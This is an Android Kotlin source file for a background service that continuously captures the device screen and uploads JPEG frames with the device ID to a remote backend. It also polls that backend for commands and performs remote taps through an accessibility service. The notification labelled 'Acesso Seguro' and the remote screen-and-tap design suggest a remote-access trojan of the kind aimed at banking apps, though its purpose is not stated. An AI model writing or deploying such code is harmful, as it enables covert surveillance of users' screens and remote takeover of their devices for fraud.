package com.remotemonitor.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URLEncoder
import java.net.URL
import java.nio.charset.StandardCharsets
import java.util.concurrent.atomic.AtomicBoolean

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var workerThread: HandlerThread? = null
    private var workerHandler: Handler? = null

    private val uploadInProgress = AtomicBoolean(false)
    private var lastUploadAt = 0L

    private val commandPollRunnable = object : Runnable {
        override fun run() {
            try {
                pollAndExecuteRemoteCommand()
            } catch (error: Exception) {
                Log.w(TAG, "Falha no poll de comando remoto", error)
            } finally {
                workerHandler?.postDelayed(this, COMMAND_POLL_INTERVAL_MS)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIFICATION_ID, buildNotification())

        workerThread = HandlerThread("screen-capture-worker").also { it.start() }
        workerHandler = Handler(workerThread!!.looper)
        workerHandler?.post(commandPollRunnable)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Int.MIN_VALUE) ?: Int.MIN_VALUE
        val resultData = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)

        if (resultCode == Int.MIN_VALUE || resultData == null) {
            Log.w(TAG, "Servico iniciado sem dados de permissao de captura")
            stopSelf()
            return START_NOT_STICKY
        }

        if (mediaProjection == null) {
            try {
                val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
                startCaptureLoop()
            } catch (error: Exception) {
                Log.w(TAG, "Falha ao iniciar MediaProjection", error)
                stopSelf()
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCaptureLoop()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startCaptureLoop() {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)

        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val densityDpi = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader?.setOnImageAvailableListener({ reader ->
            val now = System.currentTimeMillis()
            if (now - lastUploadAt < SCREEN_CAPTURE_UPLOAD_INTERVAL_MS) {
                reader.acquireLatestImage()?.close()
                return@setOnImageAvailableListener
            }

            if (!uploadInProgress.compareAndSet(false, true)) {
                reader.acquireLatestImage()?.close()
                return@setOnImageAvailableListener
            }

            val image = reader.acquireLatestImage()
            if (image == null) {
                uploadInProgress.set(false)
                return@setOnImageAvailableListener
            }

            workerHandler?.post {
                try {
                    val jpeg = imageToJpeg(image, width, height)
                    uploadScreenshot(jpeg)
                    lastUploadAt = System.currentTimeMillis()
                } catch (error: Exception) {
                    Log.w(TAG, "Falha ao processar frame de captura", error)
                } finally {
                    image.close()
                    uploadInProgress.set(false)
                }
            }
        }, workerHandler)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "RemoteMonitorCapture",
            width,
            height,
            densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            workerHandler
        )
    }

    private fun stopCaptureLoop() {
        try {
            imageReader?.setOnImageAvailableListener(null, null)
            imageReader?.close()
        } catch (_: Exception) {
        }
        imageReader = null

        try {
            virtualDisplay?.release()
        } catch (_: Exception) {
        }
        virtualDisplay = null

        try {
            mediaProjection?.stop()
        } catch (_: Exception) {
        }
        mediaProjection = null

        workerHandler?.removeCallbacks(commandPollRunnable)
        workerThread?.quitSafely()
        workerThread = null
        workerHandler = null
    }

    private fun pollAndExecuteRemoteCommand() {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: "unknown"

        val encodedPackage = URLEncoder.encode(BuildConfig.APPLICATION_ID, StandardCharsets.UTF_8.toString())
        val encodedDeviceUid = URLEncoder.encode(androidId, StandardCharsets.UTF_8.toString())
        val encodedDeviceName = URLEncoder.encode(Build.MODEL ?: "Android Device", StandardCharsets.UTF_8.toString())
        val encodedModel = URLEncoder.encode(Build.MODEL ?: "Android", StandardCharsets.UTF_8.toString())

        val endpoint =
            "${BuildConfig.BACKEND_BASE_URL}/api/device/command/next?packageName=$encodedPackage&deviceUid=$encodedDeviceUid&deviceName=$encodedDeviceName&model=$encodedModel"

        val connection = URL(endpoint).openConnection() as HttpURLConnection
        connection.requestMethod = "GET"
        connection.connectTimeout = 8_000
        connection.readTimeout = 8_000

        val statusCode = connection.responseCode
        if (statusCode !in 200..299) {
            Log.w(TAG, "Poll de comando retornou HTTP $statusCode")
            return
        }

        val body = connection.inputStream.bufferedReader().use { it.readText() }
        val json = JSONObject(body)
        if (!json.optBoolean("success")) return

        val command = json.optJSONObject("command") ?: return
        if (command.optString("type") != "tap") return

        val xPercent = command.optDouble("xPercent", -1.0)
        val yPercent = command.optDouble("yPercent", -1.0)
        if (xPercent !in 0.0..100.0 || yPercent !in 0.0..100.0) {
            Log.w(TAG, "Comando tap invalido recebido")
            return
        }

        // ✅ CORRIGIDO: Usar a instância do serviço em vez de função estática
        val service = RemoteControlAccessibilityService.instance
        if (service != null) {
            try {
                service.performTapPercent(xPercent, yPercent)
            } catch (e: Exception) {
                Log.w(TAG, "Falha ao executar tap remoto", e)
            }
        } else {
            Log.w(TAG, "Comando recebido, mas servico de acessibilidade nao esta ativo")
        }
    }

    private fun imageToJpeg(image: Image, targetWidth: Int, targetHeight: Int): ByteArray {
        val plane = image.planes[0]
        val buffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val rowPadding = rowStride - pixelStride * targetWidth

        val bitmap = Bitmap.createBitmap(
            targetWidth + rowPadding / pixelStride,
            targetHeight,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)

        val cropped = Bitmap.createBitmap(bitmap, 0, 0, targetWidth, targetHeight)
        val output = ByteArrayOutputStream()
        cropped.compress(Bitmap.CompressFormat.JPEG, 45, output)

        bitmap.recycle()
        cropped.recycle()

        val data = output.toByteArray()
        output.close()
        return data
    }

    private fun uploadScreenshot(imageBytes: ByteArray) {
        try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                ?: "unknown"
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/screenshot"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 12_000
            connection.readTimeout = 12_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val encodedImage = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("packageName", BuildConfig.APPLICATION_ID)
                put("deviceUid", androidId)
                put("deviceName", Build.MODEL ?: "Android Device")
                put("model", Build.MODEL ?: "Android")
                put("imageData", "data:image/jpeg;base64,$encodedImage")
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { writer ->
                writer.write(payload.toString())
            }

            val statusCode = connection.responseCode
            if (statusCode !in 200..299) {
                Log.w(TAG, "Upload de captura retornou HTTP $statusCode")
            }
        } catch (error: Exception) {
            Log.w(TAG, "Falha ao enviar captura da tela", error)
        }
    }

    private fun buildNotification(): Notification {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            manager.createNotificationChannel(channel)
        }

        val openAppIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            openAppIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }

        return builder
            .setContentTitle("Acesso Seguro")
            .setContentText("Captura em tempo real ativa")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    companion object {
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"

        private const val TAG = "RemoteMonitorCapture"
        private const val CHANNEL_ID = "screen_capture_channel"
        private const val NOTIFICATION_ID = 1408
        private const val SCREEN_CAPTURE_UPLOAD_INTERVAL_MS = 1200L
        private const val COMMAND_POLL_INTERVAL_MS = 1500L
    }
}
